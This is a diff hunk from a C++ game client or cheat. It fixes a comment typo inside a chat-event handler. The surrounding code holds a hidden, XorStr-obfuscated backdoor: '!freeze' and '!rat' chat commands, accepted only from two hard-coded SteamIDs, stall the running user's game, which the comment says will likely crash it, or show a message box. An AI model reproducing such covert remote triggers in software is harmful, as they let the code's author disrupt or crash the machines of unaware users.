@@ -708,13 +708,13 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 			return;
 		}
 
-		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likly crash the user
+		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
 		{
 			Sleep(5000);
 			return;
 		}
 		
-		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likly crash the user
+		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
 		{
 			MessageBox(
 				NULL,
